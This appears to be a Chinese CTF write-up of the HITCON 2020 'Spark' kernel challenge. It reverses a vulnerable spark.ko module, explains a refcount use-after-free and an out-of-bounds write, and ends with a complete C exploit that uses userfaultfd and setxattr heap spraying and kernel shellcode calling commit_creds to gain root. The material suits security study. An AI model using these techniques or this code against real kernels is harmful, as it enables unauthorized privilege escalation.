# HITCON2020 Spark


# HITCON 2020 - Spark

这是一个比较老的题目，似乎当时做出来的人并不是很多。

## 分析

题目给出了一个demo，用来告诉我们如何使用内核模块 `spark.ko` 。简单来看，它将每个打开的设备视为一个节点。可以通过 `SPARK_LINK` 将两个节点相连，并设置它们之间的距离。两个节点之间的连线是无向的通路。最后，指定一个节点 `SPARK_FINALIZE` 结束构建（我们将这个节点称为根节点）。在这之后，我们得到了一个无向图，并且不能再对其中的任何节点进行修改。只能通过 `SPARK_QUERY` 向根节点查询图中两点之间的距离。

通过逆向我们可以得到一些非常重要的数据结构

```c
struct Node {
  uint64_t index;
  uint64_t refcnt;
  uint8_t state_lock[0x20];
  uint64_t finalized;
  uint8_t nb_lock[0x20];
  uint64_t link_cnt;
  struct list_head edges;
  uint64_t traversal_idx;
  struct GraphInfo *graph_info;
};
```

该结构体维护了每个设备节点的信息。仅有根节点才有 `graph_info` 字段。该字段结构如下：

```c
struct GraphInfo {
  uint64_t cnt;
  uint64_t capacity;
  struct Node **node_array;
};
```

明显地可以看出来这个结构类似于一个向量。它在 `SPARK_FINALIZE` 时，根节点调用 `traversal` 函数创建。此函数会从根节点进行DFS遍历，将所有节点添加到 `node_array` 中，将 `Node->finalized` 置位，通过遍历顺序设置 `traversal_idx` 。

每条边的结构如下：

```c
struct Edge {
  struct list_head links;
  struct Node *dst_node;
  uint64_t weight;
};
```

边是由双向循环链接维护的。当两个节点建立连接时，会为每个节点的 `edges` 链入一个该结构。

题目实现了多个函数

```c
#define SPARK_LINK 0x4008D900LL
#define SPARK_GETINFO 0x8018D901LL
#define SPARK_FINALIZE 0xD902LL
#define SPARK_QUERY 0xC010D903LL
```

### spark_node_link

```c
__int64 __fastcall spark_node_link(struct Node *a, struct Node *b)
{
  unsigned int v2; // edx
  unsigned int weight; // r13d
  int v4; // eax
  unsigned int v6; // [rsp-34h] [rbp-34h]

  _fentry__(a, b);
  if ( a->index >= (unsigned __int64)b->index )
    return 4294967274LL;
  weight = v2;
  mutex_lock(&b->state_lock);
  mutex_lock(&a->state_lock);
  v4 = -22;
  if ( !a->finalized && !b->finalized )
  {
    spark_node_push(a, b, weight);
    spark_node_push(b, a, weight);
    v4 = 0;
  }
  v6 = v4;
  mutex_unlock(&a->state_lock);
  mutex_unlock(&b->state_lock);
  return v6;
}
```

link函数检查了两者的index是否相同，然后检查两个点是否都已 `finalized` 。然后向两个节点都添加边。

### spark_node_finalize

```c
__int64 __fastcall spark_node_finalize(struct Node *node, unsigned __int64 a2)
{
  struct Graph_info *ptr; // rax
  struct Graph_info *info; // rbx
  __int64 v5; // rdi

  _fentry__(node, a2);
  ptr = (struct Graph_info *)kmem_cache_alloc_trace(kmalloc_caches[5], 3520LL, 24LL);// 0x20
  if ( !ptr )
    return 0xFFFFFFF4LL;
  info = ptr;
  mutex_lock(&node->state_lock);
  if ( node->finalized )
  {
    kfree(info);
    mutex_unlock(&node->state_lock);
    return 0xFFFFFFEALL;
  }
  else
  {
    node->finalized = 1;
    mutex_unlock(&node->state_lock);
    v5 = kmalloc_caches[4];
    info->capacity = 2LL;
    info->node_array = (struct Node **)kmem_cache_alloc_trace(v5, 3264LL, 16LL);// 0x10
    traversal(node, info);
    node->graph_info = info;
    return 0LL;
  }
}

struct Node **__fastcall traversal(struct Node *node, struct Graph_info *info)
{
  struct Node **result; // rax
  __int64 cnt; // rsi
  struct Edge *next; // rbx
  struct Edge *i; // r12
  struct Node *next_node; // r13
  __int64 *p_refcnt; // rdi
  int v10; // eax
  struct Node **node_array; // rdi

  _fentry__(node, info);
  info->node_array[info->cnt] = node;
  result = (struct Node **)info->cnt;
  if ( info->cnt )
  {
    p_refcnt = &node->refcnt;
    v10 = _InterlockedExchangeAdd((volatile signed __int32 *)&node->refcnt, 1u);
    if ( v10 )
    {
      if ( v10 < 0 || v10 + 1 < 0 )
        refcount_warn_saturate(p_refcnt, 1LL);
      result = (struct Node **)info->cnt;
    }
    else
    {
      refcount_warn_saturate(p_refcnt, 2LL);
      result = (struct Node **)info->cnt;
    }
  }
  info->cnt = (__int64)result + 1;
  node->traversal_idx = (unsigned __int64)result;
  cnt = info->cnt;
  if ( info->cnt == info->capacity )
  {
    node_array = info->node_array;
    info->capacity = 2 * cnt;
    result = (struct Node **)krealloc(node_array, 16 * cnt, 3264LL);
    info->node_array = result;
  }
  next = (struct Edge *)node->edges.next;
  for ( i = (struct Edge *)&node->edges; next != i; next = (struct Edge *)next->link.next )
  {
    next_node = next->dst_node;
    mutex_lock(next_node->state_lock);
    if ( LODWORD(next_node->finalized) )
    {
      result = (struct Node **)mutex_unlock(next_node->state_lock);
    }
    else
    {
      LODWORD(next_node->finalized) = 1;
      mutex_unlock(next_node->state_lock);
      result = traversal(next_node, info);
    }
  }
  return result;
}
```

DFS 遍历所有的点并加入到 `node_array` 中。

### spark_graph_query

```c
__int64 __fastcall spark_graph_query(struct Graph_info *info, unsigned __int64 src)
{
  unsigned __int64 v2; // rdx
  unsigned __int64 cnt; // rax
  __int64 result; // rax
  unsigned __int64 dst; // r13
  unsigned __int64 *ptr; // rax
  unsigned __int64 total_cnt; // r11
  int _cnt; // ecx
  __int64 idx; // rdx
  struct Node **node_array; // r14
  unsigned __int64 *v11; // rcx
  unsigned __int64 base_distance; // rbx
  struct Node *n1; // r9
  struct Edge *next; // rcx
  struct Edge *i; // r9
  unsigned __int64 *cur_distance; // r8
  unsigned __int64 distance; // r10
  unsigned __int64 next_step; // r9
  int v19; // r8d
  unsigned __int64 max; // r10
  unsigned __int64 ii; // rcx
  unsigned __int64 d; // rdi
  unsigned __int64 n_s; // r9
  struct Node **next_node; // rdi
  __int64 ret; // rbx

  _fentry__(info, src);
  cnt = info->cnt;
  if ( info->cnt <= src || cnt <= v2 )
    return 0LL;
  dst = v2;
  ptr = (unsigned __int64 *)_kmalloc(8 * cnt, 0xCC0LL);
  if ( !ptr )
    return -12LL;
  total_cnt = info->cnt;
  if ( info->cnt )
  {
    _cnt = 0;
    idx = 0LL;
    do
    {
      ++_cnt;
      ptr[idx] = 0x7FFFFFFFFFFFFFFFLL;
      idx = _cnt;
    }
    while ( total_cnt > _cnt );
  }
  ptr[src] = 0LL;
  if ( src == dst )
  {
LABEL_29:
    ret = ptr[dst];
    kfree(ptr);
    result = 0LL;
    if ( ret >= 0 )
      return ret;
  }
  else
  {
    node_array = info->node_array;
    v11 = &ptr[src];
    base_distance = 0LL;
    n1 = node_array[src];
    do
    {
      *v11 = -1LL;
      next = (struct Edge *)n1->edges.next;
      for ( i = (struct Edge *)&n1->edges; next != i; next = (struct Edge *)next->link.next )
      {
        cur_distance = &ptr[next->dst_node->traversal_idx];
        if ( *cur_distance != -1LL )
        {
          distance = base_distance + next->weight;
          if ( *cur_distance > distance )       // update min distance
            *cur_distance = distance;
        }
      }
      if ( total_cnt )
      {
        next_step = src;
        v19 = 0;
        max = 0x7FFFFFFFFFFFFFFFLL;
        ii = 0LL;
        do                                      // find the shortest distance & node
        {
          d = ptr[ii];
          if ( d < max )
          {
            if ( d != -1LL )
              max = ptr[ii];
            if ( d != -1LL )
              next_step = ii;
          }
          ii = ++v19;
        }
        while ( total_cnt > v19 );
        if ( dst == next_step )
          goto LABEL_29;
        n_s = next_step;
        next_node = &node_array[n_s];
        v11 = &ptr[n_s];
      }
      else
      {
        v11 = &ptr[src];
        next_node = &node_array[src];
      }
      base_distance = *v11;
      n1 = *next_node;
    }
    while ( (*v11 & 0x7FFFFFFFFFFFFFFFLL) != 0x7FFFFFFFFFFFFFFFLL );
    kfree(ptr);
    return 0LL;
  }
  return result;
}
```

DFS 搜索更新到每个点的距离。

## Vuln

漏洞点来自，对 `refcnt` 的不正确计算导致的UAF。创建一个节点时， `refcnt` 为1。而当两个点进行连接时，`refcnt` 却不会改变。当确定根节点后，所有节点的 `refcnt` 加1。如果 `refcnt` 为1，在`close(fd)` 时会将Node结构体释放。

在连接两个节点后，释放其中一个节点，再进行 `finalize` 。这会使得内核crash但不会让内核panic。以此我们可以泄露内核地址信息。

更深层次的利用，UAF控制其中一个节点，使其指向在用户态的假节点。这样就控制了Node中的所有字段。通过 `setxattr` + `userfaultfd` 完成堆占位。

由于我们控制了一个节点，而在 `spark_graph_query` 并没有对 `traversal_idx` 进行检查。所以在如下代码中可以达成越界写：

```c
      next = (struct Edge *)n1->edges.next;
      for ( i = (struct Edge *)&n1->edges; next != i; next = (struct Edge *)next->link.next )
      {
        cur_distance = &ptr[next->dst_node->traversal_idx]; // !! vuln !!
        if ( *cur_distance != -1LL )
        {
          distance = base_distance + next->weight;
          if ( *cur_distance > distance )       // update min distance
            *cur_distance = distance;
        }
      }
```

通过覆盖返回地址为用户态的`shellcode`即可。

此题目中的难点在于假节点的构建。当节点被free后，其`edges`数据丢失，但是与其相连的另一个节点没有任何变化！

假设我们有0、1、2、3、4、5这6个节点，1-2，2-3...依次连接，最后连接1-0。关闭0，0的节点边丢失，但是1没有。选定1为根节点即可正常的访问0节点。通过合理的构造（使得0与虚假节点连接），我们即可欺骗程序，使其将用户态的节点加入`node_array`中。这样在确定根节点后，可以通过 `spark_graph_query` 访问该点！

## The full exploit

```c
#include "./exploit.h"

#define SPARK_LINK 0x4008D900LL
#define SPARK_GETINFO 0x8018D901LL
#define SPARK_FINALIZE 0xD902LL
#define SPARK_QUERY 0xC010D903LL

#define DEV_PATH "/dev/node"

#define N 12
static int fd[N];
static int efd[N];
const char l[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

struct spark_ioctl_query {
  int fd1;
  int fd2;
  long long distance;
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct GraphInfo {
  uint64_t cnt;
  uint64_t capacity;
  struct Node **node_array;
};

struct Node {
  uint64_t index;
  uint64_t refcnt;
  uint8_t state_lock[0x20];
  uint64_t finalized;
  uint8_t nb_lock[0x20];
  uint64_t link_cnt;
  struct list_head edges;
  uint64_t traversal_idx;
  struct GraphInfo *graph_info;
};

struct Edge {
  struct list_head links;
  struct Node *dst_node;
  uint64_t weight;
};

typedef int __attribute__((regparm(3)))(*_commit_creds)(void*);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(void*);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

uint64_t kernheap, kernstack;
void *target;
uint64_t kernbase;
uint64_t user_rip;

void send_msg(int id, void *buf, size_t size, int flags) {
  if (msgsnd(id, buf, size, flags) < 0) {
    die("[!] Failed to send msg");
  }
  printf("[+] Send message: 0x%lx\n", size);
}

static void setlink(int a, int b, unsigned int weight) {
  assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((unsigned long long)weight << 32)) ==
         0);
}

static void setlinke(int a, int b, unsigned int weight) {
  assert(ioctl(efd[a], SPARK_LINK,
               efd[b] | ((unsigned long long)weight << 32)) == 0);
}

static void query(int a, int b) {
  struct spark_ioctl_query qry = {
      .fd1 = fd[a],
      .fd2 = fd[b],
  };
  assert(ioctl(fd[0], SPARK_QUERY, &qry) == 0);
  printf("The length of shortest path between '%c' and '%c' is %lld\n", l[a],
         l[b], qry.distance);
}

static void fault_handler(void *arg) {
  puts("[+] Enter userpagefault");

  static struct uffd_msg uf_msg;
  uint64_t uffd = (uint64_t)arg;
  struct pollfd pollfd;
  int nready;

  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  puts("[+] polling...");
  while ((nready = poll(&pollfd, 1, -1)) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      die("[!] poll failed\n");
    }
    if ((read(uffd, &uf_msg, sizeof(uf_msg))) == 0) {
      die("[!] read uffd msg failed\n");
    }
    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      die("[!] unexpected pagefault\n");
    }

    printf("[+] user page fault: %p\n", (void *)uf_msg.arg.pagefault.address);
    assert(ioctl(fd[1], SPARK_FINALIZE) == 0);
    char *payload = calloc(1, 0x2000);
    uffd_copy(uffd, payload, (void *)uf_msg.arg.pagefault.address);
    free(payload);
    break;
  }
  puts("[+] exit userpagefault fault_handler!");
}
void heapspary(int cnt) {
  int i = 0;
  int tmp[cnt];
  for (int i = 0; i < cnt; i++) {
    tmp[i] = open(DEV_PATH, O_RDONLY);
    assert(tmp[i] >= 0);
  }
}
volatile static void kernel_shellcode() {
  int i = 0;
  uint64_t tmp;
  uint64_t *ptr = &tmp;

  for (i = 0;; i++) {
    if ((ptr[i] >= 0xffffffff81000000) && ((ptr[i] & 0xfff) == 0xb09) &&
        (ptr[i] < 0xffffffffc0000000)) {
      kernbase = ptr[i] - offset(0xffffffff81000000, 0xffffffff814b0b09);
      commit_creds = (_commit_creds)(kernbase + offset(0xffffffff81000000, 0xffffffff810be550));
      prepare_kernel_cred =
          (_prepare_kernel_cred)(kernbase + offset(0xffffffff81000000, 0xffffffff810be9c0));
      break;
    }
  }
  commit_creds(prepare_kernel_cred(0));
  __asm__(
          "push user_ss\n"
          "push user_sp\n"
          "push user_rflags\n"
          "push user_cs\n"
          "push user_rip\n"
          "swapgs\n"
          "iretq\n");
}

int main(int argc, char **argv) {
  if (argc == 3) { // pwn
    kernstack = strtoull(argv[2], NULL, 16);
    kernheap = strtoull(argv[1], NULL, 16);
    if (kernstack <= kernheap)
      die("[!] Oh, wrong address!");
  } else { // leak
    for (int i = 0; i < 2; i++) {
      fd[i] = open(DEV_PATH, O_RDONLY);
      assert(fd[i] >= 0);
    }
    setlink(0, 1, 4);
    close(fd[1]);

    // crash to leak heap and stack
    assert(ioctl(fd[0], SPARK_FINALIZE) == 0);
    exit(0);
  }
  save_state();
  user_rip = &pop_shell;
  printf("[+] kernheap:\t0x%lx\n", kernheap);
  printf("[+] kernstack:\t0x%lx\n", kernstack);

  for (int i = 0; i < N; i++) {
    fd[i] = open(DEV_PATH, O_RDONLY);
    assert(fd[i] >= 0);
  }

  for (int i = 0; i < 3; i++) {
    efd[i] = open(DEV_PATH, O_RDONLY);
    assert(efd[i] >= 0);
  }

  setlinke(0, 1, PAGE_SIZE);
  setlinke(1, 2, PAGE_SIZE);
  assert(ioctl(efd[0], SPARK_FINALIZE) == 0);

  for (int i = 0; i < N - 1; i++) {
    setlink(i, i + 1, PAGE_SIZE);
  }

  setlink(0, 1, 100);
  close(fd[0]);

  target = mmap((void *)0x1337000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if (target == MAP_FAILED) {
    die("[!] mmap target failed");
  }

  struct Node *fake_node1, *fake_node2;
  struct Edge *fake_edge = calloc(1, sizeof(struct Edge));
  struct Node *tmp;

  fake_node1 = calloc(1, sizeof(struct Node));
  fake_node2 = calloc(1, sizeof(struct Node));

  fake_node1->edges.next = &fake_node1->edges;
  fake_node1->edges.prev = &fake_node1->edges;
  fake_node1->index = 0x1337;
  fake_node1->refcnt = 1;

  fake_node2->refcnt = 1;
  fake_node2->index = 0x1338;
  fake_node2->edges.next = &fake_node2->edges;
  fake_node2->edges.prev = &fake_node2->edges;
  fake_node2->traversal_idx = ((kernstack + 0x118) - (kernheap)) / 8;

  fake_edge->links.next = (struct list_head *)(kernheap + 0x60);
  fake_edge->links.prev = (struct list_head *)(kernheap + 0x60);
  fake_edge->dst_node = fake_node1;
  fake_edge->weight = kernel_shellcode;

  RegisterUserfault(target + PAGE_SIZE, fault_handler);

  tmp = (struct Node *)target;
  tmp->edges.next = &fake_edge->links;
  tmp->edges.prev = &fake_edge->links;
  tmp->refcnt = 1;
  setxattr("/tmp", "Niebelung", tmp, sizeof(struct Node), XATTR_CREATE);

  tmp = (struct Node *)(target + PAGE_SIZE - sizeof(struct Node) + 8);
  tmp->edges.next = &fake_edge->links;
  tmp->edges.prev = &fake_edge->links;
  tmp->refcnt = 1;
  setxattr("/tmp", "Niebelung", tmp, sizeof(struct Node), XATTR_CREATE);

  sleep(1);
  fake_edge->links.next = &fake_node1->edges;
  fake_edge->links.prev = &fake_node1->edges;
  fake_edge->dst_node = fake_node2;
  fake_edge->weight = kernel_shellcode;
  fake_node2->traversal_idx = ((kernstack + 0x150) - (kernheap)) / 8;

  fake_node1->edges.next = fake_edge;
  fake_node1->edges.prev = fake_edge;
  struct spark_ioctl_query qry = {
      .fd2 = fd[8],
      .fd1 = efd[2],
  };
  assert(ioctl(fd[1], SPARK_QUERY, &qry) == 0);

  printf("[+] Done!\n");
  return 0;
}
```


